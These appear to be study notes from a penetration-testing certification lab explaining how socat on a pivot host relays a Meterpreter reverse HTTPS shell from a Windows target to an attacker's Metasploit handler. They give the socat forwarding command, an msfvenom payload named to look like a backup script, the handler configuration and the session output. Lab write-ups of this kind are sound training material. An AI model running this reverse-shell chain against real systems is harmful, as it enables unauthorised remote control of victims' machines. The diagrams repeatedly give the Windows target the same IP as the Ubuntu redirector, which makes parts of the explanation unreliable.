# 🔀 1. Socat Redirection with a Reverse Shell

> [!info] What is Socat?  
> **Socat** is a bidirectional relay tool that can connect **two independent network channels** and pass data between them.
> 
> Unlike SSH tunneling, Socat does not require an SSH tunnel. Instead, it works as a **network redirector**:
> 
> ```text
> Connection A
>     │
>     ▼
> [ Socat ]
>     │
>     ▼
> Connection B
> ```
> 
> The important idea is:
> 
> **Socat receives a connection on one socket and forwards the traffic to another socket.**
> 
> This makes it useful when a compromised/pivot host can communicate with both the target and the attacker, but the target cannot directly reach the attacker.

---

# 🧠 2. The Network Problem We Are Solving

Assume this topology:

```text
                    TARGET NETWORK
                         │
                         │
                 ┌───────▼───────┐
                 │ Windows Host  │
                 │ 172.16.5.129  │
                 └───────┬───────┘
                         │
                         │ Can reach
                         ▼
                 ┌────────────────┐
                 │ Ubuntu Server  │
                 │   Redirector   │
                 │                │
                 │ 172.16.5.x     │
                 │                │
                 │ Socat :8080    │
                 └───────┬────────┘
                         │
                         │ Can reach
                         ▼
                 ┌────────────────┐
                 │ Attack Host    │
                 │ 10.10.14.18    │
                 │                │
                 │ MSF Handler    │
                 │      :80       │
                 └────────────────┘
```

The Windows target is configured to connect to:

```text
172.16.5.129:8080
```

Instead of trying to connect directly to:

```text
10.10.14.18:80
```

The Ubuntu server acts as the **middleman**.

The traffic path becomes:

```text
Windows Target
172.16.5.129:8080
        │
        ▼
     Socat
   Ubuntu Server
        │
        ▼
10.10.14.18:80
 Attack Host
        │
        ▼
Metasploit Handler
        │
        ▼
Meterpreter Session
```

> [!important] Core Mental Model  
> Socat is **not creating a VPN or SOCKS proxy** here.
> 
> It is simply taking:
> 
> ```text
> traffic received on A
> ```
> 
> and forwarding it to:
> 
> ```text
> destination B
> ```
> 
> Think of it as a **TCP pipe between two network endpoints**.

---

# 🔀 3. Starting the Socat Listener

On the Ubuntu server:

```shell
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

This command creates the redirector.

## 🧩 Breaking Down the Command

```text
socat
│
├── TCP4-LISTEN:8080,fork
│       │
│       ├── Listen for TCP/IPv4 connections
│       ├── Listen on port 8080
│       └── fork = handle connections using a new process
│
└── TCP4:10.10.14.18:80
        │
        ├── Create TCP/IPv4 connection
        ├── Destination = 10.10.14.18
        └── Destination port = 80
```

Therefore:

```text
Windows
   │
   │ TCP → Ubuntu:8080
   ▼
┌───────────────┐
│     Socat     │
│ Ubuntu :8080  │
└───────┬───────┘
        │
        │ TCP → 10.10.14.18:80
        ▼
┌──────────────────┐
│ Attack Host :80  │
│ MSF Handler      │
└──────────────────┘
```

### `TCP4-LISTEN:8080`

Tells Socat:

> "Create an IPv4 TCP listener on port 8080."

### `fork`

Allows Socat to handle multiple incoming connections by creating a new process for each connection.

Without `fork`, handling additional connections can be more restrictive.

### `TCP4:10.10.14.18:80`

Tells Socat:

> "For an incoming connection, establish a TCP connection to `10.10.14.18` on port `80`."

---

# ⚠️ 4. Important Correction About "localhost"

The source says:

> "Socat will listen on localhost on port `8080`"

That wording is potentially misleading.

The command:

```shell
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

does **not explicitly specify** a `bind=` address such as `127.0.0.1`.

So the important conceptual point is that Socat creates a TCP listener on port `8080`; the exact listening address depends on the system/default binding behavior.

For a pivot scenario, the listener must be reachable from the Windows target.

> [!warning] CPTS Accuracy Point  
> Do not automatically interpret `TCP4-LISTEN:8080` as:
> 
> ```text
> 127.0.0.1:8080
> ```
> 
> If Socat were bound only to localhost, the remote Windows host could not connect to it.

---

# 🎯 5. Why the Payload Uses Ubuntu's IP

Now we create the Windows payload:

```shell
k33lwa@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 743 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

The important parameters are:

```text
-p windows/x64/meterpreter/reverse_https
```

Create a Windows x64 Meterpreter reverse HTTPS payload.

```text
LHOST=172.16.5.129
```

The payload should connect to:

```text
172.16.5.129
```

```text
LPORT=8080
```

The payload should connect to port:

```text
8080
```

So the payload's intended connection is:

```text
Windows Target
      │
      │ reverse HTTPS
      │
      ▼
172.16.5.129:8080
      │
      ▼
    Socat
```

> [!important] Why not put `10.10.14.18` in `LHOST`?  
> Because the Windows target cannot directly reach the attack host in this topology.
> 
> We deliberately configure the payload to connect to an address it **can reach**: the Ubuntu redirector.
> 
> The redirector then carries the connection across the network boundary.

---

# 🔄 6. Traffic Direction — The Most Important Part

There are actually **two separate connections** involved.

### Connection 1 — Target → Socat

```text
Windows
172.16.5.129
     │
     │ TCP/HTTPS
     │
     ▼
Ubuntu
:8080
```

This is created because the payload contains:

```text
LHOST=172.16.5.129
LPORT=8080
```

### Connection 2 — Socat → Attack Host

When Socat receives the connection, it creates:

```text
Ubuntu Socat
     │
     │ TCP
     │
     ▼
10.10.14.18:80
```

where the Metasploit handler is listening.

So the complete path is:

```text
┌──────────────┐
│ Windows      │
│ Target       │
└──────┬───────┘
       │
       │ 1. Reverse HTTPS
       │    → 172.16.5.129:8080
       ▼
┌──────────────┐
│ Ubuntu       │
│ Socat :8080  │
└──────┬───────┘
       │
       │ 2. Forward TCP
       │    → 10.10.14.18:80
       ▼
┌──────────────┐
│ Attack Host  │
│ MSF :80      │
└──────────────┘
```

> [!tip] Mental Shortcut  
> Always ask:
> 
> **"Who can reach whom?"**
> 
> If:
> 
> ```text
> Target → Pivot       ✅
> Pivot → Attacker     ✅
> Target → Attacker    ❌
> ```
> 
> then a redirector such as Socat can bridge the two connections.

---

# 📦 7. Transfer the Payload to Windows

The payload must be transferred to the Windows host:

```text
backupscript.exe
```

The source notes that the same file-transfer techniques from the previous sections can be used.

The important methodology is:

```text
Create payload
      │
      ▼
Transfer payload
      │
      ▼
Execute on target
      │
      ▼
Target connects to pivot
```

The exact transfer mechanism is independent of Socat.

> [!info] Separate the Problems  
> In a CPTS scenario, don't mix:
> 
> 1. **Payload creation**
>     
> 2. **Payload delivery**
>     
> 3. **Network redirection**
>     
> 4. **Listener configuration**
>     
> 5. **Session establishment**
>     
> 
> Each solves a different problem.

---

# 🖥️ 8. Start Metasploit

On the attack host:

```shell
k33lwa@htb[/htb]$ sudo msfconsole

<SNIP>
```

We then configure the handler to receive the connection that Socat forwards.

---

# 🎧 9. Configure the Metasploit `multi/handler`

```shell
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 80
lport => 80
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:80
```

## 🔍 Why These Settings?

### `use exploit/multi/handler`

The `multi/handler` is a generic Metasploit listener used to catch connections from payloads.

It is not exploiting a vulnerability itself.

Its job is essentially:

```text
Listen
  ↓
Receive payload connection
  ↓
Establish Meterpreter session
```

---

### `set payload windows/x64/meterpreter/reverse_https`

This must match the payload we generated:

```text
msfvenom:
windows/x64/meterpreter/reverse_https
```

and therefore the handler uses:

```text
windows/x64/meterpreter/reverse_https
```

> [!important] Payload/Handler Compatibility  
> The handler needs to understand the type of payload connecting to it.
> 
> Think:
> 
> ```text
> Payload
>     ↕
> Matching Handler
> ```
> 
> The transport and payload configuration need to be compatible.

---

### `set lhost 0.0.0.0`

```text
0.0.0.0
```

means the handler listens on the available local interfaces rather than restricting itself to one particular local IP.

This is useful because the forwarded connection is arriving through the attack host's network interface.

---

### `set lport 80`

The handler listens on:

```text
10.10.14.18:80
```

Conceptually:

```text
Socat
   │
   │ forwards to
   ▼
10.10.14.18:80
   │
   ▼
Metasploit Handler
```

---

# 🧠 10. Why Port 80?

The important thing is not that port `80` is inherently required for Meterpreter.

The important requirement is that:

```text
Socat destination
        =
Handler listening port
```

Here:

```text
Socat → 10.10.14.18:80
```

and:

```text
Handler → 0.0.0.0:80
```

Therefore they line up:

```text
             Socat
               │
               │ TCP
               ▼
        10.10.14.18:80
               │
               ▼
       MSF HTTPS Handler
```

If Socat forwarded to port `9000` while the handler listened on `80`, the connection would not reach the intended listener.

> [!warning] Configuration Rule  
> For a static Socat redirect:
> 
> ```text
> Socat destination IP/port
>             =
> Listener IP/port
> ```
> 
> The two ends must agree.

---

# 🔥 11. Establishing the Meterpreter Session

After executing the payload on Windows, the attack host receives:

```shell
[!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
[*] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Staging x64 payload (201308 bytes) ...
[!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (10.10.14.18:80 -> 127.0.0.1 ) at 2022-03-07 11:08:10 -0500

meterpreter > getuid
Server username: INLANEFREIGHT\victor
```

The important result is:

```text
Meterpreter session 1 opened
```

and:

```text
Server username: INLANEFREIGHT\victor
```

This confirms that the reverse connection successfully traversed the redirector and resulted in a Meterpreter session.

---

# 🔎 12. Understanding the Metasploit Output

This line:

```text
handling request from 10.129.202.64
```

identifies the source that Metasploit sees for the incoming connection.

The connection has been relayed through Socat, so the final connection as observed by the attack host does not necessarily look like a direct:

```text
Windows → Attack Host
```

connection.

The key point is that Socat has inserted itself into the traffic path.

---

# 🧩 13. Why Does Meterpreter Show `127.0.0.1`?

The output contains:

```text
Meterpreter session 1 opened (10.10.14.18:80 -> 127.0.0.1)
```

At first this can look confusing.

You might expect:

```text
Windows → 10.10.14.18
```

But the session's displayed connection information reflects the final socket/relay context rather than simply showing the original end-to-end network topology.

The important mental model is:

```text
Windows
   │
   │ reverse HTTPS
   ▼
Ubuntu
   │
   │ Socat relay
   ▼
Attack Host :80
   │
   ▼
Meterpreter
```

Do **not** interpret the `127.0.0.1` shown in this particular session display as meaning that the Windows host itself connected to localhost.

---

# 🧠 14. How the Author Arrived at This Solution

This is the methodology behind the walkthrough.

## Step 1 — Identify the routing problem

The target cannot directly reach the attack host.

```text
Target ─────X─────> Attack Host
```

But there is an intermediate Ubuntu machine:

```text
Target ─────> Ubuntu ─────> Attack Host
```

So Ubuntu becomes a potential **pivot/redirector**.

---

## Step 2 — Determine the desired traffic direction

A reverse shell needs the target to initiate a connection outward:

```text
Target
   │
   │ reverse connection
   ▼
Listener
```

But the listener is on a network the target cannot reach.

Therefore:

```text
Target
   │
   ▼
Ubuntu
   │
   ▼
Attack Host
```

---

## Step 3 — Choose a mechanism

Possible solutions include:

```text
SSH port forwarding
Meterpreter port forwarding
SOCKS proxy
Socat
```

In this section, the chosen mechanism is:

```text
Socat
```

because we only need a straightforward TCP redirect.

---

## Step 4 — Create the redirector

Ubuntu listens on:

```text
:8080
```

and forwards to:

```text
10.10.14.18:80
```

So:

```text
Target → Ubuntu:8080 → Attack Host:80
```

---

## Step 5 — Make the payload connect to the redirector

The payload uses:

```text
LHOST=172.16.5.129
LPORT=8080
```

because that is where the redirector is reachable.

The payload does **not** need to know about the final attack-host listener.

This is one of the most important concepts:

> **The payload only needs to know its immediate destination. Socat handles the next hop.**

---

## Step 6 — Configure the final listener

The attack host listens on:

```text
0.0.0.0:80
```

because Socat forwards the incoming connection there.

---

## Step 7 — Execute the payload

The connection becomes:

```text
Windows
   │
   │ 172.16.5.129:8080
   ▼
Socat
   │
   │ 10.10.14.18:80
   ▼
Metasploit
   │
   ▼
Meterpreter
```

---

# ⚔️ 15. Socat vs SSH Port Forwarding

The major difference from the previous SSH example is **how the forwarding is implemented**.

|Technique|Main Idea|Requires SSH?|Typical Use|
|---|---|--:|---|
|SSH `-L`|Forward local port through SSH|Yes|Reach a remote service through a pivot|
|SSH `-R`|Remote side forwards back through SSH|Yes|Reverse connections through pivot|
|Meterpreter `portfwd`|Meterpreter performs forwarding|No|Forward traffic through an existing Meterpreter session|
|SOCKS|Proxy arbitrary connections|No|Access many internal services|
|Socat|Direct socket-to-socket relay|No|Simple TCP redirection|

The important distinction is:

```text
SOCKS
   ↓
General-purpose proxy

Socat
   ↓
Specific listener → specific destination
```

For example:

```text
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

creates a very explicit relationship:

```text
:8080
  ↓
10.10.14.18:80
```

---

# 🗺️ 16. CPTS Pivoting Decision Model

When you discover a pivot host, don't immediately ask:

> "Which command do I remember?"

Instead ask:

```text
                ┌──────────────────────┐
                │ Target cannot reach  │
                │ attack host directly │
                └──────────┬───────────┘
                           │
                           ▼
                ┌──────────────────────┐
                │ Find a pivot that    │
                │ reaches both sides   │
                └──────────┬───────────┘
                           │
                           ▼
                 What traffic do I need?
                           │
             ┌─────────────┼──────────────┐
             │             │              │
             ▼             ▼              ▼
        One service    Many services   Reverse shell
             │             │              │
             ▼             ▼              ▼
          Socat /       SOCKS /       Socat / SSH -R /
          portfwd       ProxyChains   Meterpreter
```

The technique comes **after** understanding the network.

---

# 🧠 17. The Core Mental Model

The entire attack can be reduced to:

```text
                 "Target cannot reach me."
                           │
                           ▼
                  Find reachable pivot
                           │
                           ▼
                "Pivot can reach both."
                           │
                           ▼
                  Build a redirector
                           │
                           ▼
             Target → Pivot → Attacker
                           │
                           ▼
                    Catch the shell
```

Or, more concretely:

```text
                    REVERSE CONNECTION
                           │
                           ▼
              ┌──────────────────────┐
              │ Windows Target       │
              │ 172.16.5.129         │
              └──────────┬───────────┘
                         │
                         │ :8080
                         ▼
              ┌──────────────────────┐
              │ Ubuntu Pivot         │
              │ Socat                │
              │ :8080                │
              └──────────┬───────────┘
                         │
                         │ :80
                         ▼
              ┌──────────────────────┐
              │ Attack Host          │
              │ 10.10.14.18          │
              │ Metasploit :80       │
              └──────────┬───────────┘
                         │
                         ▼
                  Meterpreter
```

> [!success] Key Takeaway  
> **Socat is a simple network traffic bridge.**
> 
> In this scenario:
> 
> ```text
> Target → Socat → Metasploit
> ```
> 
> The target connects to the **pivot**, because the pivot is reachable. Socat then forwards that connection to the **attack host**, where the Metasploit handler receives it.
> 
> The most important CPTS skill is not memorizing:
> 
> ```shell
> socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
> ```
> 
> It is understanding **why the connection must travel that way**:
> 
> ```text
> Target cannot reach attacker
>          ↓
> Target can reach pivot
>          ↓
> Pivot can reach attacker
>          ↓
> Relay traffic through pivot
>          ↓
> Establish reverse shell
> ```